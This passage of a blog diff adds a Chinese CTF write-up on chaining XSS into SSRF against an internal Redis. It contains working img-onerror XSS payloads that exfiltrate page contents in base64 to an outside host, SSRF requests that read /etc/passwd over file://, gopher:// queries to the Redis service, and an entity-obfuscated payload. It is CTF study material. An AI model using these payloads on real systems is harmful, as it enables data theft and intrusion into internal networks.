class="subst">#x0074</span>;&amp;<span class="subst">#x0074</span>;&amp;<span class="subst">#x0070</span>;&amp;<span class="subst">#x003a</span>;&amp;<span class="subst">#x002f</span>;&amp;<span class="subst">#x002f</span>;&amp;<span class="subst">#x0061</span>;&amp;<span class="subst">#x0079</span>;&amp;<span class="subst">#x0038</span>;&amp;<span class="subst">#x0032</span>;&amp;<span class="subst">#x0072</span>;&amp;<span class="subst">#x0063</span>;&amp;<span class="subst">#x002e</span>;&amp;<span class="subst">#x0063</span>;&amp;<span class="subst">#x0065</span>;&amp;<span class="subst">#x0079</span>;&amp;<span class="subst">#x0065</span>;&amp;<span class="subst">#x002e</span>;&amp;<span class="subst">#x0069</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x002f</span>;&amp;<span class="subst">#x0027</span>;&amp;<span class="subst">#x002b</span>;&amp;<span class="subst">#x0062</span>;&amp;<span class="subst">#x0074</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x0061</span>;&amp;<span class="subst">#x0028</span>;&amp;<span class="subst">#x0064</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x0063</span>;&amp;<span class="subst">#x0075</span>;&amp;<span class="subst">#x006d</span>;&amp;<span class="subst">#x0065</span>;&amp;<span class="subst">#x006e</span>;&amp;<span class="subst">#x0074</span>;&amp;<span class="subst">#x002e</span>;&amp;<span class="subst">#x0062</span>;&amp;<span class="subst">#x006f</span>;&amp;<span class="subst">#x0064</span>;&amp;<span class="subst">#x0079</span>;&amp;<span class="subst">#x002e</span>;&amp;<span class="subst">#x0069</span>;&amp;<span class="subst">#x006e</span>;&amp;<span class="subst">#x006e</span>;&amp;<span class="subst">#x0065</span>;&amp;<span class="subst">#x0072</span>;&amp;<span class="subst">#x0048</span>;&amp;<span class="subst">#x0054</span>;&amp;<span class="subst">#x004d</span>;&amp;<span class="subst">#x004c</span>;&amp;<span class="subst">#x0029</span>;"</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>成功获取到内容<br><img src="https://i.loli.net/2019/05/01/5cc911cf367de.png" alt><br>将内容base64解码<br><img src="https://i.loli.net/2019/05/01/5cc912d520bb9.png" alt><br>保存为html即可看到后台内容,并且登陆账号为admin。<br><img src="https://i.loli.net/2019/05/01/5cc913781b339.png" alt></p>
+<p>这里可以看到两个管理员所特有的功能点<code>set admin</code> <code>send request</code><br>继续获取一下<code>request.php</code>的内容<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attr">src="x"onerror="</span></span><br><span class="line"><span class="attr">xmlhttp</span> = new XMLHttpRequest();</span><br><span class="line">xmlhttp.<span class="attr">onreadystatechange=function()&#123;</span></span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.<span class="attr">readyState</span> == <span class="number">4</span> &amp;&amp; xmlhttp.<span class="attr">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        document.<span class="attr">location</span> = 'http://zhengbao.wang?'+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"request.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br><span class="line"><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>将payload编码发送,注意这里ceye服务器收不到回显，不知为何，改用自己的vps</p>
+<p>成功读取到<code>request.php</code>页面内容。<br><img src="https://i.loli.net/2019/05/02/5ccaefd42756d.png" alt><br>base64解码后看到有发送url的操作，这里猜测具有ssrf<br><img src="https://i.loli.net/2019/05/02/5ccaf0a0811e6.png" alt></p>
+<h2 id="0x02-xssrf-file协议任意文件读取"><a href="#0x02-xssrf-file协议任意文件读取" class="headerlink" title="0x02 xssrf file协议任意文件读取"></a>0x02 xssrf file协议任意文件读取</h2><p>继续构造payload，利用ssrf通过<code>file</code>协议读取<code>/etc/passwd</code><br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attr">src="x"onerror="</span></span><br><span class="line"><span class="attr">xmlhttp</span> = new XMLHttpRequest();</span><br><span class="line">xmlhttp.<span class="attr">onreadystatechange=function()&#123;</span></span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.<span class="attr">readyState</span> == <span class="number">4</span> &amp;&amp; xmlhttp.<span class="attr">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        document.<span class="attr">location</span> = 'http://zhengbao.wang?'+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"POST"</span>,<span class="string">"request.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">xmlhttp.send(<span class="string">"url=file:///etc/passwd"</span>);</span><br><span class="line"><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>发现可以获取到<code>/etc/passwd</code><br><img src="https://i.loli.net/2019/05/02/5ccaf3ca9a921.png" alt><br>至此已经可以任意文件读取了，这是一道ctf题目，在robots.txt中提示让读取<code>config.php</code><br><img src="https://i.loli.net/2019/05/02/5ccaf46a09ad6.png" alt><br>那么我们便可以继续修改上面的payload读取config.php。<br><img src="https://i.loli.net/2019/05/02/5ccaf6a42d22d.png" alt><br>进一步获取到在内网<code>25566</code>端口运行着<code>redis</code><br>那么便可以通过<code>gopher</code>协议去攻击内网redis了。</p>
+<h2 id="0X04-xssrf-gopher协议攻击内网redis"><a href="#0X04-xssrf-gopher协议攻击内网redis" class="headerlink" title="0X04 xssrf gopher协议攻击内网redis"></a>0X04 xssrf gopher协议攻击内网redis</h2><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attr">src="x"onerror="</span></span><br><span class="line"><span class="attr">xmlhttp</span> = new XMLHttpRequest();</span><br><span class="line">xmlhttp.<span class="attr">onreadystatechange=function()&#123;</span></span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.<span class="attr">readyState</span> == <span class="number">4</span> &amp;&amp; xmlhttp.<span class="attr">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        document.<span class="attr">location</span> = 'http://zhengbao.wang?'+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"POST"</span>,<span class="string">"request.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">xmlhttp.send(<span class="string">"url=gopher://127.0.0.1:25566/_info%250a_quit"</span>);</span><br><span class="line"><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure>
+<p>成功获得redis info信息。<br><img src="https://i.loli.net/2019/05/03/5ccbb184d23dd.png" alt></p>
+<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://skysec.top/2018/08/17/xss-ssrf-redis/" target="_blank" rel="noopener">https://skysec.top/2018/08/17/xss-ssrf-redis/</a><br><a href="https://www.kingkk.com/2018/08/redis未授权访问与ssrf利用" target="_blank" rel="noopener">https://www.kingkk.com/2018/08/redis未授权访问与ssrf利用</a><br><a href="https://www.cnblogs.com/go2bed/p/4136358.html" target="_blank" rel="noopener">https://www.cnblogs.com/go2bed/p/4136358.html</a></p>
 
       
     </div>
@@ -476,12 +488,12 @@
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/semcms-php-v3-8-时间盲注/">semcms_php_v3.8 时间盲注</a></p>
+  <p><span>本文标题:</span><a href="/XSSRF攻击内网redis/">XSSRF攻击内网redis</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 boogle 的个人博客">boogle</a></p>
-  <p><span>发布时间:</span>2019年03月15日 - 21:23</p>
-  <p><span>最后更新:</span>2019年03月25日 - 08:35</p>
-  <p><span>原始链接:</span><a href="/semcms-php-v3-8-时间盲注/" title="semcms_php_v3.8 时间盲注">https://zhengbao.wang/semcms-php-v3-8-时间盲注/</a>
-    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://zhengbao.wang/semcms-php-v3-8-时间盲注/" aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2019年05月03日 - 11:23</p>
+  <p><span>最后更新:</span>2019年05月03日 - 11:24</p>
+  <p><span>原始链接:</span><a href="/XSSRF攻击内网redis/" title="XSSRF攻击内网redis">https://zhengbao.wang/XSSRF攻击内网redis/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://zhengbao.wang/XSSRF攻击内网redis/" aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -540,9 +552,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/代码审计/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
+            <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i> xss</a>
           
-            <a href="/tags/0day挖掘/" rel="tag"><i class="fa fa-tag"></i> 0day挖掘</a>
+            <a href="/tags/ssrf/" rel="tag"><i class="fa fa-tag"></i> ssrf</a>
           
         </div>
       
@@ -555,8 +567,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/semcms-php-v3-8-cookie注入绕过后台登陆/" rel="next" title="semcms_php_v3.8 cookie注入绕过后台登陆">
-                <i class="fa fa-chevron-left"></i> semcms_php_v3.8 cookie注入绕过后台登陆
+              <a href="/文件上传功能的一些另类利用/" rel="next" title="文件上传功能的一些另类利用">
+                <i class="fa fa-chevron-left"></i> 文件上传功能的一些另类利用
               </a>
             
           </div>
@@ -564,10 +576,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/semcms-php-v3-8-后台注入getshell/" rel="prev" title="semcms_php_v3.8 后台注入getshell">
-                semcms_php_v3.8 后台注入getshell <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -762,7 +770,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-web-check-php时间盲注得后台账号密码"><span class="nav-number">2.</span> <span class="nav-text">0x01 web_check.php时间盲注得后台账号密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-poc"><span class="nav-number">3.</span> <span class="nav-text">0x02 poc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-修改后台密码"><span class="nav-number">4.</span> <span class="nav-text">0x03 修改后台密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-修复方法"><span class="nav-number">5.</span> <span class="nav-text">0x04 修复方法</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0X00-前言"><span class="nav-number">1.</span> <span class="nav-text">0X00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-XSS获取管理员cooklie"><span class="nav-number">2.</span> <span class="nav-text">0x01 XSS获取管理员cooklie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-xss登陆内网后台"><span class="nav-number">3.</span> <span class="nav-text">0x02 xss登陆内网后台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-xssrf-file协议任意文件读取"><span class="nav-number">4.</span> <span class="nav-text">0x02 xssrf file协议任意文件读取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X04-xssrf-gopher协议攻击内网redis"><span class="nav-number">5.</span> <span class="nav-text">0X04 xssrf gopher协议攻击内网redis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-参考链接"><span class="nav-number">6.</span> <span class="nav-text">0x05 参考链接</span></a></li></ol></div>
             
 
           </div>
